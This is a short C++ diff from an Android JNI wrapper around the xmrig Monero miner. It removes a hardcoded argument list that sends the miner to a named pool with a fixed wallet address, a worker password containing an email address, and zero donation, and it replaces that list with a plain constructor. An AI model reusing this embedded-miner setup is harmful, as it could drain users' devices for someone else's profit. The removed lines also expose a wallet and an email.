@@ -22,7 +22,6 @@
  */
 #include "App.h"
 #include "common/log/AndroidLog.h"
-#include "StringUtils.h"
 
 jobject jcallbackObj;
 JNIEnv* jenv;
@@ -35,20 +34,7 @@ extern "C" {
          jenv = env;
          jcallbackObj = callback;
 
-         int argc = 16;
-         int threadCounts = (int) threads;
-         int cpuUses = (int) cpu_uses;
-         char *argv[] = {
-            (char*)"./xmrig",
-            (char*)"--api-port", (char*)"556",
-            (char*)"-o", (char*)"xmr.waterhole.xyz:3333",
-            (char*)"-u", (char*)"46Ffvb3jf7ZcVqgPjeReAfZyAk7qKm4FqMb6g6SsT6bpKAhPo9EtNKUVEdMpk62zPpB9GJt75xTD75vYHKredVB3RDHfxdY",
-            (char*)"-p", (char*)"worker1:651043704@qq.com",
-            (char*)"--thread", intToChar(threadCounts),
-            (char*)"--max-cpu-usage", intToChar(cpuUses),
-            (char*)"--donate-level", "0",
-            (char*) "-k"};
-         App app(argc, argv);
+         App app((int) threads, (int) cpu_uses);
          app.exec();
     }
 }
